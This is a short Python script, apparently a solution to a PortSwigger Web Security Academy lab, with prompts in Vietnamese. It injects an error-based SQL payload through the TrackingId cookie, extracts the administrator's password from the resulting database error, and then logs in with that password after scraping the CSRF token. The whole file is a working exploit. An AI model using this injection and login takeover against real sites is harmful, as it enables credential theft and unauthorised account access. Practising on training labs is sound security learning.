import requests
from bs4 import BeautifulSoup
import re

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

payload = f"'AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"

cookies = {
    "TrackingId": payload,
    "session": "70ipyj4mj7XlFojaO9xMj1cbpoiewWAu"
}

response = requests.get(url, cookies=cookies)

match = re.search(r'integer: "(.{20})"', response.text)

if match:
    password = match.group(1)
else:
    print("Không tìm thấy chuỗi phù hợp.")

login_url = f"{url}/login"

session = requests.Session()
response = session.get(login_url)

if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}

response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("Login successful!")